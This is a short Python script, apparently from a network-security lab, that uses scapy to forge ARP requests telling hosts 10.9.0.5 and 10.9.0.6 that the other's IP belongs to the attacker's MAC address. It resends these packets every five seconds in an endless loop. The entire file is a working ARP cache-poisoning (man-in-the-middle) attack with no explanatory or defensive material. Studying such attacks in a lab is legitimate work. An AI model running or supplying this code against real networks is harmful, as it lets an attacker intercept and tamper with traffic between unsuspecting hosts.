from scapy.all import *
import time

ether1=Ether()
ether1.dst='02:42:0a:09:00:05'


arp1=ARP()
arp1.op=1
arp1.hwsrc='02:42:0a:09:00:69'
arp1.psrc='10.9.0.6'
arp1.hwdst='02:42:0a:09:00:05'
arp1.pdst='10.9.0.5'

ether2=Ether()
ether2.dst='02:42:0a:09:00:06'

arp2=ARP()
arp2.op=1
arp2.hwsrc='02:42:0a:09:00:69'
arp2.psrc='10.9.0.5'
arp2.hwdst='02:42:0a:09:00:06'
arp2.pdst='10.9.0.6'

pkt1=ether1/arp1
pkt2=ether2/arp2
while 1:
    sendp(pkt1)
    sendp(pkt2)
    time.sleep(5)
